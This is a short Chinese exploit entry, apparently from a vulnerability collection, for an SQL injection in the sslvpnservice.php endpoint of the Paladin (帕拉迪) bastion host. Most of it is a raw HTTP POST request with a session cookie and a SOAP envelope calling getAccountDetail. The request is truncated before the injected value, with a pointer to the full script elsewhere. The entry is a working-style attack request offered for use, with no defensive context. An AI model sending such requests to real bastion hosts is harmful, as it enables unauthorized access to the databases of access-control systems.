# 帕拉迪堡垒机sslvpnservice.php存在SQL注入漏洞

- **系统**：帕拉迪堡垒机　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`POST /sslvpnservice.php HTTP/1.1`

**请求体 / payload**
```
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580
<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"super…（脚本共 1497 字，完整版见原文）
```
- **预期**：200　|　—